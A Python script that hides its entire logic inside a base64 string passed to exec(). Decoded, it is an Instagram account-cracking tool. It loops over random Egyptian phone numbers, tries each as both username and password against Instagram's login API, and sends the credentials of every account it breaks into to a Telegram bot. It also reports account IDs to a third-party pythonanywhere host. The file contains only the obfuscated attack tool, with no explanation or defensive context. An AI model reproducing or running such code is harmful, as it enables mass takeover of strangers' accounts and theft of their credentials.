import base64
exec(base64.b64decode("aW1wb3J0IG9zLCBzeXMsIHJlcXVlc3RzCmltcG9ydCB3ZWJicm93c2VyCndlYmJyb3dzZXIub3BlbignaHR0cHM6Ly90Lm1lL21hbGFfaDRtYScpCm9zLnN5c3RlbSgnY2xlYXInKQpaID0gJ1x4MWJbMTszMW0nCkEgPSAnXHgxYlsxOzMzbScKWjEgPSAnXHgxYlsyOzMxbScKRiA9ICdceDFiWzI7MzJtJwpYID0gJ1x4MWJbMjszNG0nCkMgPSAnXHgxYlsyOzM1bScKUyA9ICdceDFiWzI7MzZtJwpZID0gJ1x4MWJbMTszNG0nCnRyeToKICAgIGltcG9ydCBvcwogICAgZnJvbSB0aW1lIGltcG9ydCBzbGVlcAogICAgaW1wb3J0IHdlYmJyb3dzZXIsIHJhbmRvbSwgcmVxdWVzdHMKICAgIGZyb20gdXNlcl9hZ2VudCBpbXBvcnQgZ2VuZXJhdGVfdXNlcl9hZ2VudAogICAgaW1wb3J0IGpzb24KICAgIGZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4CiAgICBpbXBvcnQgc2VjcmV0cywgc3lzCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgdGltZScpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHdlYmJyb3dzZXIgJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmFuZG9tJykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcmVxdWVzdHMnKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCB1c2VyX2FnZW50JykKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwganNvbicpCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHNlY3JldHMnKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBzeXMnKQogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCiAgICBpbXBvcnQgdGltZSwgd2ViYnJvd3NlciwgcmFuZG9tLCByZXF1ZXN0cwogICAgZnJvbSB1dWlkIGltcG9ydCB1dWlkNAogICAgZnJvbSB1c2VyX2FnZW50IGltcG9ydCBnZW5lcmF0ZV91c2VyX2FnZW50CiAgICBpbXBvcnQganNvbgogICAgZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXgKICAgIGltcG9ydCBzZWNyZXRzLCBzeXMKZWxzZToKICAgIGZyb20gdGltZSBpbXBvcnQgc2xlZXAKICAgIGltcG9ydCB3ZWJicm93c2VyLCByYW5kb20sIHJlcXVlc3RzCiAgICBmcm9tIHVzZXJfYWdlbnQgaW1wb3J0IGdlbmVyYXRlX3VzZXJfYWdlbnQKICAgIGltcG9ydCBqc29uCiAgICBmcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleAogICAgaW1wb3J0IHNlY3JldHMsIHN5cwogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBhYSA9IDAKICAgIHp6ID0gMAogICAgaW1wb3J0IHRpbWUKICAgIHRpbWVlID0gdGltZS5hc2N0aW1lKCkKICAgIHQgPSB0aW1lLmxvY2FsdGltZSgpCiAgICBjdXJyZW50X3RpbWUgPSB0aW1lLnN0cmZ0aW1lKCclSDolUjolIEVPJywgdCkKCiAgICBkZWYgYSh6KToKICAgICAgICBmb3IgZSBpbiB6OgogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICBzbGVlcCgwLjEpCgoKcHJpbnQoQSArICIiIvCfj7PZhdmA2YDZgNuV2YTZgNmA2YDYpyDYrdmA2YDZgNuV2YXZgNmA2YDZgNuV8J+Tv/CdkLXvv73vv73vv73vv73vv73vv73vv73vv70gICAgICAgIiIiKQpwcmludCgn4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4p2D4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4p2D4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4p2D4peG4pSB4pSB4pSB4pSB4pSB4pSB4peGICAgICAgICAgICcpCklEID0gaW5wdXQoWiArICfwnZGw8J2RqyAg4oeSICcpCnRvayA9IGlucHV0KFogKyAn8J2Ru/CdkbbwnZGy8J2RrPCdkbUgIOKHkiAnKQpkZWYgY29kZV9qb28odXNlclEsIHBhc3N3b3JkKToKICAgIGNvb2tpZSA9IHNlY3JldHMudG9rZW5faGV4KDgpICogMgogICAgaGVhZCA9IHsnSE9TVCc6J3d3dy5pbnN0YWdyYW0uY29tJywgICdLZWVwQWxpdmUnOidUcnVlJywgCiAgICAgJ3VzZXItYWdlbnQnOidNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQ3LjAuMjUyNi43MyBTYWZhcmkvNTM3LjM2JywgCiAgICAgJ0Nvb2tpZSc6Y29va2llLCAKICAgICAnQWNjZXB0JzonKi8qJywgCiAgICAgJ0NvbnRlbnRUeXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywgCiAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOidYTUxIdHRwUmVxdWVzdCcsIAogICAgICdYLUlHLUFwcC1JRCc6JzkzNjYxOTc0MzM5MjQ1OScsIAogICAgICdYLUluc3RhZ3JhbS1BSkFYJzonbWlzc2luZycsIAogICAgICdYLUNTUkZUb2tlbic6J21pc3NpbmcnLCAKICAgICAnQWNjZXB0LUxhbmd1YWdlJzonZW4tVVMsZW47cT0wLjknfQogICAgdXJsX2lkID0gZiJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL3t1c2VyUX0vP19fYT0xIgogICAgcmVxX2lkID0gcmVxdWVzdHMuZ2V0KHVybF9pZCwgaGVhZGVycz1oZWFkKS5qc29uKCkKICAgIG5hbWUgPSBzdHIocmVxX2lkWydncmFwaHFsJ11bJ3VzZXInXVsnZnVsbF9uYW1lJ10pCiAgICBpZCA9IHN0cihyZXFfaWRbJ2dyYXBocWwnXVsndXNlciddWydpZCddKQogICAgZm9sbG93ZXMgPSBzdHIocmVxX2lkWydncmFwaHFsJ11bJ3VzZXInXVsnZWRnZV9mb2xsb3dlZF9ieSddWydjb3VudCddKQogICAgZm9sbG93aW5nID0gc3RyKHJlcV9pZFsnZ3JhcGhxbCddWyd1c2VyJ11bJ2VkZ2VfZm9sbG93J11bJ2NvdW50J10pCiAgICByZSA9IHJlcXVlc3RzLmdldChmImh0dHBzOi8vbzdhYS5weXRob25hbnl3aGVyZS5jb20vP2lkPXtpZH0iKQogICAgcmVlID0gcmUuanNvbigpCiAgICBkYXQgPSByZWVbJ2RhdGEnXQogICAgdCA9IHRpbWUubG9jYWx0aW1lKCkKICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoJyVIOiVFOiVSTycsIHQpCiAgICBqb28zID0gZiIiIiDirZDinIUgIPCfj7PZhdmA2YDZgNuV2YTZgNmA2YDYpyDYrdmA2YDZgNuV2YXZgNmA2YDZgNuV8J+Tvwril4bilIHilIHilIHilIHilIHilIHil4binYPil4bilIHilIHilIHilIHilIHilIHil4YK8J2RtfCdkajwnZG08J2RrCDjgKAgOiB7bmFtZX0gCvCdkbzwnZG68J2RrPCdkbkg8J2RtfCdkajwnZG08J2RrCDijJggOiB7dXNlclF9CvCdkbfwnZGo8J2RuvCdkbrwnZG+8J2RtvCdkbnwnZGrIPCfmYogOiB7cGFzc3dvcmR9CvCdka3wnZG28J2Rs/CdkbPwnZG28J2RvvCdkazwnZG6IPCfkawgOiB7Zm9sbG93ZXN9CvCdka3wnZG28J2Rs/CdkbPwnZG+8J2RsPCdkbXwnZGuIPCfka0gOiB7Zm9sbG93aW5nfQrwnZGq8J2RufCdkajwnZG78J2RrCDwnZGr8J2RqPCdkbvwnZGoIOKaoCA6IHtkYXR9CvCdkbvwnZGw4pOC8J2RrCA6IHtjdXJyZW50X3RpbWV9CvCdmanwnZmd8J2ZnvCdmagg8J2ZhPCdmagg8J2Zj/CdmZ3wnZmaIPCdmYPwnZmq8J2Zo/Cdmakg8J2ZifCdmarwnZmi8J2Zl/CdmZrwnZmnIFt7enp9XSDinIXwn6SkCuKXhuKUgeKUgeKUgeKUgeKUgeKUgeKXhuKdg+KXhuKUgeKUgeKUgeKUgeKUgeKUgeKXhgrwnZGp8J2SgCA6IEBtYWxhX2g0bWEg4p2DIPCdkarwnZGvIDpAcHl0aG9uNDUzIiIiCiAgICB0bGcgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7dG9rfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRH0mdGV4dD1cbiB7am9vM30gXG4iCiAgICBpID0gcmVxdWVzdHMucG9zdCh0bGcpCgoKdXJsID0gJ2h0dHBzOi8vYi5pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2FjY291bnRzL2xvZ2luLycKaGVhZGVycyA9IHsnVXNlci1BZ2VudCc6ICdJbnN0YWdyYW0gMTEzLjAuMC4zOS4xMjIgQW5kcm9pZCAoMjQvNS4wOyA1MTVkcGk7IDE0NDB4MjQxNjsgaHVhd2VpL2dvb2dsZTsgTmV4dXMgNlA7IGFuZ2xlcjsgYW5nbGVyOyBlbl9VUyknfQpzbGVlcCgxKQpzbGVlcCgwKQp1c2VyID0gJzEyMzQ1Njc4OTAnCk5VTUIgPSBbJzAxMTInLCcwMTExJywnMDExNSddCndoaWxlIFRydWU6CiAgICBvcCA9IHJhbmRvbS5jaG9pY2UoTlVNQikKICAgIHVzID0gc3RyKCcnLmpvaW4oKHJhbmRvbS5jaG9pY2UodXNlcikgZm9yIGkgaW4gcmFuZ2UoNykpKSkKICAgIHVzZXJuYW1lID0gJysyJytvcCArIHVzCiAgICBwYXNzd29yZCA9ICBvcCArIHVzCiAgICBmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0CiAgICB1aWQgPSBzdHIodXVpZDQoKSkKICAgIGRhdGEgPSB7J3V1aWQnOnVpZCwgICdwYXNzd29yZCc6cGFzc3dvcmQsIAogICAgICd1c2VybmFtZSc6dXNlcm5hbWUsIAogICAgICdkZXZpY2VfaWQnOnVpZCwgCiAgICAgJ2Zyb21fcmVnJzonZmFsc2UnLCAKICAgICAnX2NzcmZ0b2tlbic6J21pc3NpbmcnLCAKICAgICAnbG9naW5fYXR0ZW1wdF9jb3VudG4nOicwJ30KICAgIHJlcSA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSkKICAgIGlmICdsb2dnZWRfaW5fdXNlcicgaW4gcmVxLmpzb24oKToKICAgICAgICB6eiArPSAxCiAgICAgICAgdXNlclEgPSByZXEuanNvbigpWydsb2dnZWRfaW5fdXNlciddWyd1c2VybmFtZSddCiAgICAgICAgY29kZV9qb28odXNlclEsIHBhc3N3b3JkKQogICAgZWxpZiAnIm1lc3NhZ2UiOiJjaGFsbGVuZ2VfcmVxdWlyZWQiLCJjaGFsbGVuZ2UiJyBpbiByZXEuanNvbigpOgogICAgICAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQogICAgICAgIHByaW50KChaMSArIGYiIiJ7dXNlcm5hbWV9Cgril4bilIHilIHilIHilIHilIHilIHil4binYPil4bilIHilIHilIHilIHilIHilIHil4YKSElUID0ge3p6fQpCQUQgPSB7YWF9CuKXhuKUgeKUgeKUgeKUgeKUgeKUgeKXhuKdg+KXhuKUgeKUgeKUgeKUgeKUgeKUgeKXhiIiIiksZW5kPScnKQogICAgZWxzZToKICAgICAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKICAgICAgICBwcmludChaMSsgJ01hbGEgIPCflKUgJykKICAgICAgICBwcmludCgnICcpCiAgICAgICAgcHJpbnQoKEYrIGYiIiJ7dXNlcm5hbWV9CiAK4peG4pSB4pSB4pSB4pSB4pSB4pSB4peG4p2D4peG4pSB4pSB4pSB4pSB4pSB4pSB4peGCkhJVCA9IHt6en0KQkFEID0ge2FhfQril4bilIHilIHilIHilIHilIHilIHil4binYPil4bilIHilIHilIHilIHilIHilIHil4YiIiIpLGVuZD0nJykKICAgICAgICBhYSArPSAx"))
